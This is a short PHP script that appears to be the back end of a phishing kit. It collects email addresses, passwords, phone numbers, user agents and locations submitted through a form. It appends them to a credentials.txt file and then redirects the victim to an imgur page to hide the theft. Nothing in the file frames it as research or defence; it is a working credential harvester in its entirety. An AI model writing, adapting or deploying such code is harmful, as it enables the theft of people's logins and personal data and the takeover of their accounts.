<?php
  $output_list = fopen("../credentials.txt", "a") or die("Unable to access file.");
  $email = $_POST['email'];
  $password = $_POST['password'];
  $phone = $_POST['phone'];
  $agent = $_POST['agent'];
  $location = $_POST['location'];

  fwrite($output_list, "[Email] {$email} [Password] {$password} [Phone] {$phone} [User-Agent] {$agent} [Location] {$location}\n");
  fclose($output_list);

  header('Location: https://imgur.com/gallery/GRfafOv');
  die();
?>